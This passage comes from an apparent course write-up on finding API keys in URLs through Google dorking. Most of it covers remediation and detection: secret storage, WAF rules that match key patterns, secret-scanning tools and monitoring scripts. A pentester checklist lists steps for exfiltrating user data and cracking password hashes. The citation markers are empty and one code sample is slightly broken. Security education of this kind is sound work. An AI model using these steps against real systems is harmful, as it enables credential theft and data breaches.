3. Navigate to: Removals
4. Click: New Request
5. Enter URL: https://target.com/api/users?apikey=...
6. Select: "Remove this URL only" or "Remove all URLs with this prefix"
7. Submit request

# Verify removal after 24-48 hours
site:target.com inurl:api
```


***

### Remediation Step 6: Secure Credential Storage [][]

**Never Hard-Code API Keys** []:

**WRONG (Hard-coded)** []:

```javascript
// ‚ùå NEVER DO THIS
const API_KEY = "sk_live_abc123def456ghi789";
```

**CORRECT (Environment Variables)**:

```javascript
// ‚úÖ Read from environment
const API_KEY = process.env.API_KEY;

// Validate that key exists
if (!API_KEY) {
    throw new Error('API_KEY environment variable not set');
}
```

**Environment File (.env)**:

```bash
# .env (NEVER commit to Git)
API_KEY=sk_live_abc123def456ghi789
DB_PASSWORD=supersecure123
JWT_SECRET=random_secret_value_here
```

**.gitignore**:

```
# Ignore environment files
.env
.env.local
.env.production
*.key
*.pem
config/secrets.json
```

**Secret Management Services** [][]:

**AWS Secrets Manager**:

```javascript
const AWS = require('aws-sdk');
const secretsManager = new AWS.SecretsManager();

async function getSecret(secretName) {
    const data = await secretsManager.getSecretValue({
        SecretId: secretName
    }).promise();
    
    return JSON.parse(data.SecretString);
}

// Usage
const secrets = await getSecret('prod/api/keys');
const API_KEY = secrets.API_KEY;
```

**HashiCorp Vault**:

```javascript
const vault = require('node-vault')({
    endpoint: process.env.VAULT_ADDR,
    token: process.env.VAULT_TOKEN
});

async function getSecret(path) {
    const result = await vault.read(path);
    return result.data;
}

// Usage
const secrets = await getSecret('secret/data/api');
const API_KEY = secrets.data.api_key;
```


***

## üîê Long-Term Security Hardening

### 1. API Gateway Implementation

**Benefits of API Gateway** []:

- Centralized authentication and authorization
- Rate limiting and throttling []
- Request/response transformation
- Comprehensive logging and monitoring
- DDoS protection

**Example: AWS API Gateway Configuration**:

```yaml
# API Gateway with API Key required
Resources:
  UsersAPI:
    Type: AWS::ApiGateway::RestApi
    Properties:
      Name: Users API
      ApiKeySourceType: HEADER # Require API key in header
  
  UsersResource:
    Type: AWS::ApiGateway::Resource
    Properties:
      ParentId: !GetAtt UsersAPI.RootResourceId
      PathPart: users
      RestApiId: !Ref UsersAPI
  
  UsersMethod:
    Type: AWS::ApiGateway::Method
    Properties:
      AuthorizationType: API_KEY # Require API key
      ApiKeyRequired: true
      HttpMethod: GET
      ResourceId: !Ref UsersResource
      RestApiId: !Ref UsersAPI
```


### 2. Web Application Firewall (WAF) Rules

**ModSecurity Rules for API Protection**:

```apache
# Block API keys in query strings
SecRule ARGS_NAMES "@rx (api|key|apikey|api_key|access_key|secret|token|password)" \
    "id:2001,phase:2,log,msg:'Sensitive parameter in query string',severity:CRITICAL"

# Block suspicious API key patterns
SecRule ARGS "@rx (sk_live_|sk_test_|AIzaSy|AKIA)" \
    "id:2002,phase:2,deny,status:403,msg:'API key pattern detected in URL'"

# Require Authorization header for API endpoints
SecRule REQUEST_URI "@beginsWith /api/" \
    "id:2003,phase:1,chain,msg:'API request without Authorization header'"
SecRule &REQUEST_HEADERS:Authorization "@eq 0" \
    "deny,status:401"
```


### 3. Continuous Security Monitoring

**SIEM Alert for URL Parameter Exposure**:

```
# Splunk Query
index=web_logs 
| rex field=uri "(?<params>\?.*)"
| rex field=params "(?<api_key>apikey=[\w-]+)"
| where isnotnull(api_key)
| stats count by src_ip, api_key
| where count > 5
| alert "API Key Detected in URL Parameters"
```

**Automated Google Dork Monitoring**:

```python
#!/usr/bin/env python3
# /usr/local/bin/api-key-exposure-monitor.py

import time
from googlesearch import search
import smtplib

def monitor_api_exposure(domain):
    """Check for API key exposure in Google"""
    dorks = [
        f'site:{domain} inurl:api',
        f'site:{domain} inurl:key',
        f'site:{domain} inurl:apikey',
        f'site:{domain} inurl:token',
    ]
    
    findings = []
    
    for dork in dorks:
        try:
            results = list(search(dork, num_results=10))
            for url in results:
                # Check if URL contains sensitive parameters
                if '?' in url and any(param in url.lower() for param in ['api', 'key', 'token', 'password']):
                    findings.append(url)
            time.sleep(15)
        except Exception as e:
            print(f"Error: {e}")
    
    if findings:
        send_alert(findings)
    
    return findings

def send_alert(findings):
    """Send email alert about exposed keys"""
    subject = f"[CRITICAL] API Keys Found in Google"
    body = "The following URLs with sensitive parameters were found:\n\n"
    body += "\n".join(findings)
    
    # Send email (configure SMTP)
    print(body)

# Run weekly via cron
if __name__ == "__main__":
    monitor_api_exposure("target.com")
```

**Cron Schedule**:

```bash
# /etc/cron.d/api-exposure-monitor
# Weekly monitoring every Sunday at midnight
0 0 * * 0 root /usr/bin/python3 /usr/local/bin/api-key-exposure-monitor.py
```


***

## üìä Pentester's Sensitive URL Data Discovery Checklist

**Reconnaissance Phase**:

- [ ] Execute primary API key Google Dorks [file:59]
- [ ] Search for authentication credentials in URLs []
- [ ] Hunt for session tokens and authentication tokens
- [ ] Look for PII in URL parameters []
- [ ] Search for database connection strings
- [ ] Check for cryptocurrency/payment keys

**Analysis Phase**:

- [ ] Extract all discovered API keys and tokens [file:59]
- [ ] Document URL patterns and parameter names
- [ ] Identify key formats and vendors (Stripe, AWS, Google)
- [ ] Analyze parameter sensitivity levels
- [ ] Check Wayback Machine for historical exposures

**Validation Phase**:

- [ ] Test each API key for validity [file:59]
- [ ] Enumerate accessible API endpoints
- [ ] Assess read vs write permissions
- [ ] Test rate limiting and IP restrictions
- [ ] Document data access capabilities [file:59]

**Exploitation Phase**:

- [ ] Exfiltrate accessible user data [file:59]
- [ ] Extract password hashes for cracking [file:59]
- [ ] Identify high-value targets (admin accounts) [file:59]
- [ ] Test for CRUD operations (Create, Read, Update, Delete)
- [ ] Assess potential for lateral movement

**Reporting Phase**:

- [ ] Calculate CVSS scores for each finding
- [ ] Document complete attack chain with evidence [file:59]
- [ ] Provide API request/response samples
- [ ] Include data classification (PII, financial, etc.)
- [ ] Write comprehensive remediation steps []

***

## üß∞ Tools for Sensitive URL Parameter Discovery

### 1. truffleHog - Find Secrets in Git

```bash
# Installation
pip3 install truffleHog

# Scan Git repository for secrets
trufflehog git https://github.com/target/repo --regex --entropy=True

# Scan for specific patterns
trufflehog git https://github.com/target/repo \
    --regex \
    --rules /path/to/custom-rules.json
```

**Custom Rules (custom-rules.json)**:

```json
{
  "API Keys": {
    "pattern": "(api[_-]?key|apikey|access[_-]?key)[\"']?\\s*[:=]\\s*[\"']?([a-zA-Z0-9_\\-]{20,})"
  },
  "AWS Keys": {
    "pattern": "(AKIA[0-9A-Z]{16})"
  },
  "Stripe Keys": {
    "pattern": "(sk_live_[0-9a-zA-Z]{24})"
  }
}
```


### 2. GitGuardian - Automated Secret Detection

```bash
# Installation
pip3 install ggshield

# Scan current directory
ggshield secret scan path .

# Scan Git history
ggshield secret scan repo https://github.com/target/repo

# CI/CD integration
ggshield secret scan ci
```


### 3. Custom Burp Extension for URL Parameter Analysis

```python
# burp-url-param-analyzer.py
from burp import IBurpExtender, IHttpListener
import re

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("URL Parameter Analyzer")
        callbacks.registerHttpListener(self)
        
        self.sensitive_params = [
            'api', 'key', 'apikey', 'api_key',
            'password', 'passwd', 'pwd',
            'token', 'access_token', 'auth_token',
            'secret', 'secret_key',
            'session', 'session_id', 'sessid'
        ]
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if messageIsRequest:
            request = messageInfo.getRequest()
            analyzedRequest = self._helpers.analyzeRequest(messageInfo)
            
            url = analyzedRequest.getUrl().toString()
            
            # Check for sensitive parameters in URL
            if '?' in url:
                params = url.split('?')
                
                for sensitive_param in self.sensitive_params:
                    if sensitive_param in params.lower():
                        self._callbacks.issueAlert(
                            f"Sensitive parameter '{sensitive_param}' found in URL: {url}"
                        )
                        
                        # Add to scan issues
                        self._callbacks.addScanIssue(
                            CustomScanIssue(
                                messageInfo.getHttpService(),
                                analyzedRequest.getUrl(),
                                [messageInfo],
                                "Sensitive Data in URL",
                                f"The parameter '{sensitive_param}' was found in the URL query string",
                                "High"
                            )
                        )
```


***

## üìö Additional Resources

| **Resource** | **Description** | **URL** |
| :-- | :-- | :-- |
| OWASP API Security Top 10 | API Security Risks | owasp.org/www-project-api-security/ [] |
| OWASP URL Parameter Exposure | Information Exposure via Query Strings | owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url [] |
| Legit Security | API Key Security Best Practices | legitsecurity.com/aspm-knowledge-base/api-key-security-best-practices [] |
| TechTarget | API Key Weaknesses and Security | techtarget.com/searchsecurity/tip/API-keys-Weaknesses-and-security-best-practices [] |
| GitGuardian | Google API Key Remediation | gitguardian.com/remediation/google-api-key [] |


***

## üéì Key Takeaways for Penetration Testers

### Why Sensitive URL Data Discovery is Critical

1. **Easy Discovery, High Impact**: Single Google query exposes complete API access [file:59][]
2. **Common Misconfiguration**: Developers frequently expose secrets in URLs [][]
3. **Persistent Exposure**: Google indexing makes data publicly searchable indefinitely [file:59][]
4. **Real-World Prevalence**: Found in production systems across all industries [][]

### How to Use in Engagements

**Black Box Testing**:

- Start every engagement with sensitive URL parameter searches [file:59]
- Automated Google Dorking reveals API keys without active testing [file:59]
- Test discovered keys for immediate data access [file:59]

**Bug Bounty Hunting**:

- Quick wins for high-severity findings [file:59]
- Clear demonstration of impact (user data access) [file:59]
- Combine with other vulnerabilities for maximum bounty

**Red Team Operations**:

- Passive reconnaissance with zero detection [file:59]
- Initial access credentials for persistence
- API access enables data exfiltration and lateral movement


### What Makes a Strong Finding

Your penetration test report should include [file:59][]:

1. **Discovery Method**: Exact Google Dork query used [file:59]
2. **Credential Evidence**: API key/token extracted (sanitized) [file:59]
3. **Validation Proof**: Demonstrate key functionality [file:59]
4. **Data Access**: Document exposed information [file:59]
5. **Impact Analysis**: Quantify risk and business impact []
6. **CVSS Scoring**: Typically 8.5-9.5 (Critical) []
7. **Comprehensive Remediation**: Header-based auth, key rotation, monitoring [][]

***

## ‚öñÔ∏è Ethical and Legal Considerations

**Authorization Requirements**:

- Google Dorking public URLs is generally legal
- Testing discovered API keys requires explicit authorization []
- Accessing user data via compromised keys is unauthorized access
- Always obtain written permission before active exploitation

**Responsible Disclosure** [file:59][]:

- Notify client immediately of exposed API keys []
- Provide emergency key revocation guidance []
- Do not access more data than necessary for PoC []
- Follow coordinated disclosure timelines

**Data Handling**:

- Delete all exfiltrated data after documentation [file:59]
- Use anonymized samples in reports
- Encrypt all evidence and communications
- Follow data retention policies in engagement contract

**Professional Standards**:

- Test only systems within authorized scope
- Document all activities for audit trail
- Maintain confidentiality of discovered credentials
- Adhere to industry certifications (OSCP, CEH, PNPT, GPEN)

***

## üèÅ Conclusion

This demonstration illustrates a critical and commonly exploited vulnerability: sensitive data exposure in URL parameters [file:59][][]. Through simple Google Dorking, an API key was discovered in a publicly indexed URL [file:59]. Testing confirmed this key provided unauthorized access to a REST API endpoint exposing user emails and password hashes [file:59][]. This finding represents a complete authentication and access control bypass with immediate data breach implications [].

For penetration testers, sensitive URL parameter discovery provides:

- **Rapid Results**: Minutes from query to credential access [file:59]
- **High Severity**: Direct data access without complex exploitation [file:59][]
- **Clear Impact**: Demonstrated with actual data exfiltration [file:59]
- **Common Occurrence**: Found across web applications and APIs [][]

The systematic methodology documented in this writeup‚Äîfrom Google Dorking through API key extraction to data exfiltration‚Äîrepresents one of the most efficient and high-impact penetration testing techniques [file:59]. Organizations must implement header-based authentication, comprehensive logging, key rotation policies, and continuous monitoring to prevent this critical vulnerability class [][][][].

**Key Lesson**: Never transmit sensitive data in URL parameters. Use HTTP headers, implement time-limited tokens, and prevent search engine indexing of API endpoints [][].

***


---

## üìù About This Documentation

**Practical Testing Performed By**: Muhammad Izaz Haider

**Course**: EC-Council's Short Course - *Web Application Security Testing with Google Hacking*

**Purpose**: This documentation demonstrates the practical application of Google Dorking techniques learned during the course, transforming theoretical knowledge into hands-on security testing methodologies.

---

*This writeup is intended for educational purposes and authorized security testing only. Unauthorized testing of systems you don't own or have explicit permission to test is illegal.*
